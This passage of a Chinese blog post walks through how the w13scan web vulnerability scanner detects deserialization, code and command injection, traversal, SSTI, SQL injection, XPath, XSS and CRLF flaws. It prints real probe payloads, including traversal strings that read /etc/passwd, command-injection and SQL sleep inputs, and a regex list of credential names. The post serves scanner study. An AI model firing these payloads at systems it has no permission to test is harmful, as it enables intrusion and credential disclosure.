class="string">&#x27;^[O]:\d+:&quot;[^&quot;]+&quot;:\d+:&#123;.*&#125;&#x27;</span>, value) <span class="keyword">or</span> re.match(<span class="string">&#x27;^a:\d+:&#123;(s:\d:&quot;[^&quot;]+&quot;;|i:\d+;).*&#125;&#x27;</span>, ret):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p><code>isPythonObjectDeserialization</code></p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关键代码</span></span><br><span class="line"><span class="comment"># pickle binary</span></span><br><span class="line"><span class="keyword">if</span> value.startswith(<span class="string">&quot;g&quot;</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bytes</span>(ret).startswith(<span class="built_in">bytes</span>.fromhex(<span class="string">&quot;8003&quot;</span>)) <span class="keyword">and</span> ret.endswith(<span class="string">&quot;.&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pickle text versio</span></span><br><span class="line"><span class="keyword">elif</span> value.startswith(<span class="string">&quot;K&quot;</span>):</span><br><span class="line">    <span class="keyword">if</span> (ret.startswith(<span class="string">&quot;(dp1&quot;</span>) <span class="keyword">or</span> ret.startswith(<span class="string">&quot;(lp1&quot;</span>)) <span class="keyword">and</span> ret.endswith(<span class="string">&quot;.&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>Python 的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字节流转化回原始的对象的一个过程。</p>
</blockquote>
<p>原理:根据序列化后参数的<strong>字节的特征序列</strong></p>
<hr />
<h3 id="asp代码执行">asp代码执行</h3>
<p>暂只支持Get请求方式和回显型的ASP代码注入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payloads = [</span><br><span class="line">    <span class="string">&#x27;response.write(&#123;&#125;*&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(randint1, randint2),</span><br><span class="line">    <span class="string">&#x27;\&#x27;+response.write(&#123;&#125;*&#123;&#125;)+\&#x27;&#x27;</span>.<span class="built_in">format</span>(randint1, randint2),</span><br><span class="line">    <span class="string">&#x27;&quot;response.write(&#123;&#125;*&#123;&#125;)+&quot;&#x27;</span>.<span class="built_in">format</span>(randint1, randint2),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p><code>response.write()</code>函数相当于<code>print()</code>,上面的payload就是输出随机字符</p>
<p>原理:</p>
<p>某个参数点如果能执行我们payload里的输出函数,输出一个我们自己定义的随机字符，则认为有代码注入</p>
<hr />
<h3 id="php代码执行">php代码执行</h3>
<p>暂只支持Get请求方式和回显型的PHP代码注入以及cookie中的代码注入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payloads = [</span><br><span class="line">    <span class="string">&quot;print(md5(&#123;&#125;));&quot;</span>,</span><br><span class="line">    <span class="string">&quot;;print(md5(&#123;&#125;));&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&#x27;;print(md5(&#123;&#125;));$a=&#x27;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;\&quot;;print(md5(&#123;&#125;));$a=\&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;$&#123;&#123;@print(md5(&#123;&#125;))&#125;&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;$&#123;&#123;@print(md5(&#123;&#125;))&#125;&#125;\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&#x27;.print(md5(&#123;&#125;)).&#x27;&quot;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>原理:同上</p>
<hr />
<h3 id="系统命令执行">系统命令执行</h3>
<p>测试系统命令注入，支持Windows/Linux,暂只支持Get请求方式和回显型的命令注入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_flag = &#123;</span><br><span class="line">            <span class="string">&quot;set|set&amp;set&quot;</span>: [</span><br><span class="line">                <span class="string">&#x27;Path=[\s\S]*?PWD=&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Path=[\s\S]*?PATHEXT=&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Path=[\s\S]*?SHELL=&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Path\x3d[\s\S]*?PWD\x3d&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Path\x3d[\s\S]*?PATHEXT\x3d&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Path\x3d[\s\S]*?SHELL\x3d&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;SERVER_SIGNATURE=[\s\S]*?SERVER_SOFTWARE=&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;SERVER_SIGNATURE\x3d[\s\S]*?SERVER_SOFTWARE\x3d&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Non-authoritative\sanswer:\s+Name:\s*&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Server:\s*.*?\nAddress:\s*&#x27;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;echo `echo 6162983|base64`6162983&quot;</span>.<span class="built_in">format</span>(randint): [</span><br><span class="line">                <span class="string">&quot;NjE2Mjk4Mwo=6162983&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>key<code>&quot;set|set&amp;set&quot;</code>这个是payload是系统的一个命令</p>
<blockquote>
<p>set指令能设置所使用shell的执行方式，可依照不同的需求来做设置。</p>
</blockquote>
<p>value<code>'Path=[\s\S]*?PWD='</code>这个是正则表达式。</p>
<hr />
<h3 id="cors检测">cors检测</h3>
<p>寻找CORS能否利用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;access-control-allow-origin&quot;</span> <span class="keyword">in</span> resp_headers <span class="keyword">and</span> resp_headers[<span class="string">&quot;access-control-allow-origin&quot;</span>] == <span class="string">&quot;*&quot;</span>:</span><br><span class="line">   <span class="keyword">if</span> <span class="string">&quot;access-control-allow-credentials&quot;</span> <span class="keyword">in</span> resp_headers <span class="keyword">and</span> resp_headers[<span class="string">&quot;access-control-allow-credentials&quot;</span>].lower() == <span class="string">&#x27;true&#x27;</span>:</span><br><span class="line">       out.success(url, self.name, payload=<span class="built_in">str</span>(data), method=method)</span><br></pre></td></tr></table></figure>
<p>原理:识别返回包header中的特征</p>
<hr />
<h3 id="目录穿越">目录穿越</h3>
<p>通过url特征判断系统的指纹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> filepath.endswith(<span class="string">&quot;.aspx&quot;</span>) <span class="keyword">or</span> filepath.endswith(<span class="string">&quot;.asp&quot;</span>): <span class="comment"># 有.aspx和.asp</span></span><br><span class="line">    isunix = <span class="number">2</span>   <span class="comment"># 不是unix</span></span><br><span class="line">    iswin = <span class="number">1</span>    <span class="comment"># 肯定是win</span></span><br><span class="line">    isjava = <span class="number">2</span>   <span class="comment"># 不是java</span></span><br><span class="line"><span class="keyword">if</span> filepath.endswith(<span class="string">&quot;.jsp&quot;</span>):<span class="comment"># 有.jsp</span></span><br><span class="line">    isjava = <span class="number">1</span>   <span class="comment"># 肯定是java</span></span><br></pre></td></tr></table></figure>
<p>根据不同平台来发包的字典:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="number">1</span> &gt;= isunix &gt;= <span class="number">0</span>:  <span class="comment"># Unix平台</span></span><br><span class="line">    payloads.append(<span class="string">&quot;../../../../../../../../../../etc/passwd&quot;</span>)</span><br><span class="line">    payloads.append(<span class="string">&quot;/etc/passwd&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> origin:</span><br><span class="line">        payloads.append(dirname + <span class="string">&quot;/../../../../../../../../../../etc/passwd&quot;</span>)</span><br><span class="line">        payloads.append(dirname + <span class="string">&quot;/../../../../../../../../../../etc/passwd&#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            unquote(<span class="string">&quot;%00&quot;</span>) + default_extension))</span><br><span class="line">    payloads.append(<span class="string">&quot;../../../../../../../../../../etc/passwd&#123;&#125;&quot;</span>.<span class="built_in">format</span>(unquote(<span class="string">&quot;%00&quot;</span>)))</span><br><span class="line">    payloads.append(</span><br><span class="line">        <span class="string">&quot;../../../../../../../../../../etc/passwd&#123;&#125;&quot;</span>.<span class="built_in">format</span>(unquote(<span class="string">&quot;%00&quot;</span>)) + default_extension)</span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span> &gt;= iswin &gt;= <span class="number">0</span>:   <span class="comment"># wins平台</span></span><br><span class="line">    payloads.append(<span class="string">&quot;../../../../../../../../../../windows/win.ini&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> origin:</span><br><span class="line">        payloads.append(dirname + <span class="string">&quot;/../../../../../../../../../../windows/win.ini&quot;</span>)</span><br><span class="line">    payloads.append(<span class="string">&quot;C:\\WINDOWS\\system32\\drivers\\etc\\hosts&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span> &gt;= isjava &gt;= <span class="number">0</span>:  <span class="comment"># java语言</span></span><br><span class="line">    payloads.append(<span class="string">&quot;/WEB-INF/web.xml&quot;</span>)</span><br><span class="line">    payloads.append(<span class="string">&quot;../../WEB-INF/web.xml&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>判断返回包有目录穿越的规则:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plainArray = [     <span class="comment"># 字符串特征</span></span><br><span class="line">    <span class="string">&quot;; for 16-bit app support&quot;</span>,</span><br><span class="line">    <span class="string">&quot;[MCI Extensions.BAK]&quot;</span>,</span><br><span class="line">    <span class="string">&quot;# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;# localhost name resolution is handled within DNS itself.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;[boot loader]&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">regexArray = [      <span class="comment"># 正则表达式</span></span><br><span class="line">    <span class="string">&#x27;(Linux+\sversion\s+[\d\.\w\-_\+]+\s+\([^)]+\)\s+\(gcc\sversion\s[\d\.\-_]+\s)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(root:.*:.*:)&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;System\.IO\.FileNotFoundException: Could not find file\s&#x27;\w:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;System\.IO\.DirectoryNotFoundException: Could not find a part of the path\s&#x27;\w:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;b&gt;Warning&lt;\/b&gt;:\s\sDOMDocument::load\(\)\s\[&lt;a\shref=&#x27;domdocument.load&#x27;&gt;domdocument.load&lt;\/a&gt;\]:\s(Start tag expected|I\/O warning : failed to load external entity).*(Windows\/win.ini|\/etc\/passwd).*\sin\s&lt;b&gt;.*?&lt;\/b&gt;\son\sline\s&lt;b&gt;\d+&lt;\/b&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&lt;web-app[\s\S]+&lt;\/web-app&gt;)&quot;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<hr />
<h3 id="模板表达式注入">模板表达式注入</h3>
<p>服务端模板注入SSTI,对GET请求参数进行相关测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payloads = &#123;</span><br><span class="line">                <span class="string">&quot;&#123;ranstr&#125;$&#123;&#123;&#123;int1&#125;*&#123;int2&#125;&#125;&#125;&#123;ranstr&#125;&quot;</span>.<span class="built_in">format</span>(ranstr=randstr, int1=randint1, int2=randint2),</span><br><span class="line">                <span class="string">&quot;&#123;ranstr&#125;#&#123;&#123;&#123;int1&#125;*&#123;int2&#125;&#125;&#125;&#123;ranstr&#125;&quot;</span>.<span class="built_in">format</span>(ranstr=randstr, int1=randint1, int2=randint2)</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在 Twig 模板引擎里,   除了可以输出传递的变量以外,还能<strong>执行一些基本的表达式然后将其结果作为该模板变量的值</strong>,例如这里用户输入 name=20 ,则在服务端拼接的模版内容为:<br />
<img src="https://i.loli.net/2019/12/30/TbMXmH87tdzeUQc.png" alt="20191230202751.png" /></p>
</blockquote>
<p>原理:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>利用模板引擎能执行一些基本的表达式</p>
</li>
<li class="lvl-2">
<p>前后加随机字符串是为了减少误报</p>
</li>
</ul>
<hr />
<h3 id="js敏感文件探测">js敏感文件探测</h3>
<p>从返回js的包中匹配敏感内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">regx = (</span><br><span class="line">        <span class="comment"># 匹配url</span></span><br><span class="line">        <span class="string">r&#x27;(\b|\&#x27;|&quot;)(?:http:|https:)(?:[\w/\.]+)?(?:[a-zA-Z0-9_\-\.]&#123;1,&#125;)\.(?:php|asp|ashx|jspx|aspx|jsp|json|action|html|txt|xml|do)(\b|\&#x27;|&quot;)&#x27;</span>,</span><br><span class="line">        <span class="comment"># 匹配邮箱</span></span><br><span class="line">        <span class="string">r&#x27;[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(?:\.[a-zA-Z0-9_-]+)+&#x27;</span>,</span><br><span class="line">        <span class="comment"># 匹配token或者密码泄露</span></span><br><span class="line">        <span class="comment"># 例如token = xxxxxxxx, 或者&quot;apikey&quot; : &quot;xssss&quot;</span></span><br><span class="line">        <span class="string">r&#x27;\b(?:secret|secret_key|token|secret_token|auth_token|access_token|username|password|aws_access_key_id|aws_secret_access_key|secretkey|authtoken|accesstoken|access-token|authkey|client_secret|bucket|email|HEROKU_API_KEY|SF_USERNAME|PT_TOKEN|id_dsa|clientsecret|client-secret|encryption-key|pass|encryption_key|encryptionkey|secretkey|secret-key|bearer|JEKYLL_GITHUB_TOKEN|HOMEBREW_GITHUB_API_TOKEN|api_key|api_secret_key|api-key|private_key|client_key|client_id|sshkey|ssh_key|ssh-key|privatekey|DB_USERNAME|oauth_token|irc_pass|dbpasswd|xoxa-2|xoxrprivate-key|private_key|consumer_key|consumer_secret|access_token_secret|SLACK_BOT_TOKEN|slack_api_token|api_token|ConsumerKey|ConsumerSecret|SESSION_TOKEN|session_key|session_secret|slack_token|slack_secret_token|bot_access_token|passwd|api|eid|sid|api_key|apikey|userid|user_id|user-id)[&quot;\s]*(?::|=|=:|=&gt;)[&quot;\s]*[a-z0-9A-Z]&#123;8,64&#125;&quot;?&#x27;</span>,</span><br><span class="line">        <span class="comment"># 匹配IP地址</span></span><br><span class="line">        <span class="string">r&#x27;\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.)&#123;3&#125;(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b&#x27;</span>,</span><br><span class="line">        <span class="comment"># 匹配云泄露</span></span><br><span class="line">        <span class="string">r&#x27;[\w]+\.cloudfront\.net&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;[\w\-.]+\.appspot\.com&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;[\w\-.]*s3[\w\-.]*\.?amazonaws\.com\/?[\w\-.]*&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;([\w\-.]*\.?digitaloceanspaces\.com\/?[\w\-.]*)&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;(storage\.cloud\.google\.com\/[\w\-.]+)&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;([\w\-.]*\.?storage.googleapis.com\/?[\w\-.]*)&#x27;</span>,</span><br><span class="line">        <span class="comment"># 匹配手机号</span></span><br><span class="line">        <span class="string">r&#x27;(?:139|138|137|136|135|134|147|150|151|152|157|158|159|178|182|183|184|187|188|198|130|131|132|155|156|166|185|186|145|175|176|133|153|177|173|180|181|189|199|170|171)[0-9]&#123;8&#125;&#x27;</span></span><br><span class="line">        <span class="comment"># 匹配域名</span></span><br><span class="line">        <span class="string">r&#x27;((?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]&#123;0,61&#125;[a-zA-Z0-9])?\.)+(?:biz|cc|club|cn|com|co|edu|fun|group|info|ink|kim|link|live|ltd|mobi|net|online|org|pro|pub|red|ren|shop|site|store|tech|top|tv|vip|wang|wiki|work|xin|xyz|me))&#x27;</span></span><br><span class="line"></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
<hr />
<h3 id="jsonp探测">jsonp探测</h3>
<hr />
<h3 id="通用敏感文件探测">通用敏感文件探测</h3>
<p>从返回包中搜集通用的敏感信息</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># phpinfo</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;title&gt;phpinfo()&lt;/title&gt;&quot;</span> <span class="keyword">in</span> resp_str:</span><br><span class="line">    info = get_phpinfo(resp_str)</span><br><span class="line">    out.success(url, self.name, info=info)</span><br></pre></td></tr></table></figure>
<hr />
<h3 id="php真实路径检测">php真实路径检测</h3>
<p>对于一些php网站，将正常参数替换为<code>[]</code>可能造成真实信息泄漏</p>
<p>篡改:正常参数替换为<code>[]</code></p>
<p>判断:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;Warning&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> <span class="string">&quot;array given&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    path = get_middle_text(r.text, <span class="string">&#x27;array given in &#x27;</span>, <span class="string">&#x27; on line&#x27;</span>)</span><br><span class="line">    out.success(_, self.name, path=path, raw=r.raw)</span><br></pre></td></tr></table></figure>
<hr />
<h3 id="重定向插件">重定向插件</h3>
<p>支持检查 html meta 跳转、30x 跳转、JavaScript跳转等等</p>
<hr />
<h3 id="sql注入-基于报错">sql注入 (基于报错)</h3>
<p>支持GET、COOKIE、HEADER头注入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sql_flag = <span class="string">&#x27;鎈\&#x27;&quot;\(&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这是sqli测试最简单的一种,就是用某个字符尝试去引起sql报错，然后回显在页面。</p>
<p>接着用正则去匹配不同数据库的错误信息。</p>
<hr />
<h3 id="sql注入-布尔盲注">sql注入(布尔盲注)</h3>
<p>布尔盲注利用前提:</p>
<p>页面没有显示位，没有输出SQL语句执行错误信息，只能通过页面返回正常不正常来判断是否存在注入。</p>
<p>发包:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>源request</p>
</li>
<li class="lvl-2">
<p>true page的request(<code>AND 110=110</code>)</p>
</li>
<li class="lvl-2">
<p>false page的request(<code>AND 110=109</code>)</p>
</li>
</ul>
<p>对返回的content处理(优化手段):</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>removeDynamicContent()</code>,目的是减少无关的内容的干扰,比如广告什么的。</p>
</li>
<li class="lvl-2">
<p><code>getFilteredPageContent()</code>，去掉html标签,提取页面文本,例如<code>'&lt;html&gt;&lt;title&gt;foobar&lt;/title&gt;&lt;body&gt;test&lt;/body&gt;&lt;/html&gt;'</code>处理完会变成<code>foobar test</code></p>
</li>
</ul>
<p>判断漏洞:</p>
<p>以页面相似度作为依据,原始请求 ≈ 预期为真请求 ≠ 预期与假请求</p>
<blockquote>
<p>有空还需要再认真看一下这部分的代码</p>
</blockquote>
<blockquote>
<p>原作者的说明:<br />
首先访问一次网页，和原网页对比，若相似度小于0.98则动态去除网页中不同的部分。访问一次False页面，得到False页面与原页面的相似度 <code>ratio_false</code><br />
访问一次True页面，得到True页面与原页面的相似度 <code>ratio_true</code><br />
<code>ratio_true</code> &gt; 0.88 and <code>ratio_true</code> - <code>ratio_false</code> &gt; 0.05 and <code>ratio_false</code> &lt; 0.98 即可判断为sql注入否则按照换行符分隔原始页面，True页面，False页面获得<code>originSet</code>,<code>trueSet</code>,<code>falseSet</code>集合。<br />
<code>originSet</code> 对 <code>trueSet</code>的差集小于2并且 <code>trueSet</code> != <code>falseSet</code> 并且 <code>trueSet</code> 对<code>falseSet</code>差集大于0 即可判断为注入。</p>
</blockquote>
<hr />
<h3 id="sql注入-基于时间">sql注入(基于时间)</h3>
<p>这部分内容我不太懂,直接copy原作者的描述好了。。。</p>
<p>基于时间的探测方式，会因为一些网络的波动，影响最后的判断结果。sqlmap的时间盲注会先发送30个请求来建立模型，但对扫描器来说，这样的效率太低了，所以就采用了awvs的时间盲注检测方法。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>延时长度</p>
<ul class="lvl-2">
<li class="lvl-6">
<p>awvs将延时分为了四种类型，0延时<code>ZeroDelay</code>,长延时<code>LongDelay</code>，非常长延时<code>VeryLongDelay</code>,中间延时<code>MidDelay</code>，顾名思义，每种类型延时的时间不一样。</p>
</li>
<li class="lvl-6">
<p>这些时间延时类型的判断依据只靠两个参数<code>longDuration</code>,<code>shortDuration</code></p>
</li>
<li class="lvl-6">
<p>这两个参数由下面算法计算</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> internal_ip:</span><br><span class="line">self.longDuration = <span class="number">6</span></span><br><span class="line">self.shortDuration = <span class="number">2</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">self.longDuration = <span class="number">3</span></span><br><span class="line">self.shortDuration = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r1 = requests.get(self.url, headers=self.headers)</span><br><span class="line">time1 = r1.elapsed.total_seconds()</span><br><span class="line">r2 = requests.get(self.url, headers=self.headers) </span><br><span class="line">time2 = r2.elapsed.total_seconds()</span><br><span class="line"></span><br><span class="line">_<span class="built_in">min</span> = <span class="built_in">min</span>(time1, time2)</span><br><span class="line">_<span class="built_in">max</span> = <span class="built_in">max</span>(time1, time2)</span><br><span class="line"></span><br><span class="line">self.shortDuration = <span class="built_in">max</span>(self.shortDuration, _<span class="built_in">max</span>) + <span class="number">1</span></span><br><span class="line">self.longDuration = self.shortDuration * <span class="number">2</span></span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-6">
<p>可以看到内外网不同判断的参数也不一样</p>
</li>
</ul>
</li>
<li class="lvl-2">
<p>随机延时测试</p>
<ul class="lvl-2">
<li class="lvl-6">接下来就是随机选取一种延时的类型来判断是否达到了延时需要的时间。</li>
<li class="lvl-6">awvs至少会进行8次这样的随机延时测试，测试成功即可判断存在注入</li>
<li class="lvl-6">当然，误差的容错也是有的，可以直接看代码。这种方式虽然暴力了点但是似乎没有其他好的办法了。</li>
</ul>
</li>
</ul>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql_flag = [</span><br><span class="line">        &#x27;/**/aNd(sEleCt+slEEp(&#123;time&#125;)uNiOn+sElect+1)&#x27;,</span><br><span class="line">        &quot;&#x27;aNd(sEleCt+slEEp(&#123;time&#125;)uNiOn/**/sElect+1)=&#x27;&quot;,</span><br><span class="line">        &#x27;&quot;aNd(sEleCt+slEEp(&#123;time&#125;)uNiOn/**/sElect+1)=&quot;&#x27;,</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>
<p>比较精妙之处在于多次发包，再判断。</p>
<p>此处缺一个图。</p>
<hr />
<h3 id="被动子域名搜索">被动子域名搜索</h3>
<p>从返回包中搜集子域名</p>
<p>正则匹配</p>
<hr />
<h3 id="xpath-注入">xpath 注入</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payloads = [</span><br><span class="line">    <span class="string">&quot;&#x27;\&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;!--&quot;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>篡改发包:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>遍历参数,在参数值后面加上payload即可</p>
</li>
<li class="lvl-2">
<p>在response包用2种规则匹配。</p>
</li>
</ul>
<p>两种判断规则:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>字符串特征:</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plainArray = [</span><br><span class="line">    <span class="string">&#x27;MS.Internal.Xml.&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Unknown error in XPath&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;org.apache.xpath.XPath&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A closing bracket expected in&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;An operand in Union Expression does not produce a node-set&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cannot convert expression to a number&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Document Axis does not allow any context Location Steps&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Empty Path Expression&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Empty Relative Location Path&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Empty Union Expression&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Expected node test or name specification after axis operator&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Incompatible XPath key&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Incorrect Variable Binding&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;libxml2 library function failed&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A document must contain exactly one root element.&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;font face=&quot;Arial&quot; size=2&gt;Expression must evaluate to a node-set.&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Expected token \&#x27;\]\&#x27;&#x27;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p>正则:</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">regexArray = [</span><br><span class="line">    <span class="string">&quot;(Invalid (predicate|expression|type) in .*?\son line)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&lt;b&gt;\sException\sDetails:\s&lt;\/b&gt;System\.Xml\.XPath\.XPathException:\s&#x27;.*&#x27;\shas\san\sinvalid\stoken\.&lt;br&gt;&lt;br&gt;)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&lt;b&gt;\sException\sDetails:\s&lt;\/b&gt;System\.Xml\.XPath\.XPathException:\sThis\sis\san\sunclosed\sstring\.&lt;br&gt;&lt;br&gt;)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(System.Xml.XPath.XPathException\:)&quot;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr />
<h3 id="xss注入">xss注入</h3>
<p>暂只支持Get请求方式</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rndStr = <span class="number">9000</span> + random.randint(<span class="number">1</span>, <span class="number">999</span>)</span><br><span class="line">tag = random_str(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">html_payload = <span class="string">&quot;&lt;&#123;tag&#125;&gt;&#123;randint&#125;&lt;/&#123;tag&#125;&gt;&quot;</span>.<span class="built_in">format</span>(tag=tag, randint=rndStr)  <span class="comment"># html xss</span></span><br><span class="line"></span><br><span class="line">attr_payload = [</span><br><span class="line">    <span class="string">&#x27;&quot; oNsOmeEvent=&quot;console.log(233)&#x27;</span>,  <span class="comment"># 双引号payload</span></span><br><span class="line">    <span class="string">&quot;&#x27; oNsOmeEvent=&#x27;console.log(2333)&quot;</span>,  <span class="comment"># 单引号payload</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">url_payload = <span class="string">&quot;javascript&amp;colon;&#123;randint&#125;&quot;</span>.<span class="built_in">format</span>(randint=rndStr)</span><br><span class="line"></span><br><span class="line">javascript_payload = <span class="string">&quot;&#123;randint&#125;&quot;</span>.<span class="built_in">format</span>(randint=rndStr)</span><br></pre></td></tr></table></figure>
<p>判断是否输出点是否在<code>&lt;script&gt;</code>标签内,</p>
<p>如果是就使用<code>javascript_payload</code></p>
<p>如果不是就测试<code>html xss</code>、<code>标签属性xss</code>、<code>url xss</code></p>
<blockquote>
<p>需要补充…</p>
</blockquote>
<hr />
<h3 id="crlf注入">crlf注入</h3>
<p>暂只支持Get请求方式</p>
<p>payloads:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payloads = [</span><br><span class="line">    <span class="string">&quot;\r\nTestInject: w13scan&quot;</span>,</span><br><span class="line">    <span class="string">&quot;\r\n\tTestInject: w13scan&quot;</span>,</span><br><span class="line">    <span class="string">&quot;\r\n TestInject: w13scan&quot;</span>,</span><br><span class="line">    <span class="string">&quot;\r\tTestInject: w13scan&quot;</span>,</span><br><span class="line">    <span class="string">&quot;\nTestInject: w13scan&quot;</span>,</span><br><span class="line">    <span class="string">&quot;\rTestInject: w13scan&quot;</span>,</span><br><span class="line">    <span class="comment"># twitter crlf</span></span><br><span class="line">    <span class="string">&quot;嘊嘍TestInject: w13scan&quot;</span>,</span><br><span class="line">    <span class="comment"># nodejs crlf</span></span><br><span class="line">    <span class="string">&quot;čĊTestInject: w13scan&quot;</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>发包:</p>
<hr />
<h3 id="cookie控制插件">cookie控制插件</h3>
<hr />
<h3 id="js漏洞库查找">js漏洞库查找</h3>
<p>检测到当前页面存在过时的含有漏洞的js组件</p>
<hr />
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.anquanke.com/post/id/86641">【技术分享】如何攻击Java反序列化过程</a></p>
</li>
<li class="lvl-2">
<p><a href="http://www.polaris-lab.com/index.php/archives/178/">Python Pickle的任意代码执行漏洞实践和Payload构造</a></p>
</li>
<li class="lvl-2">
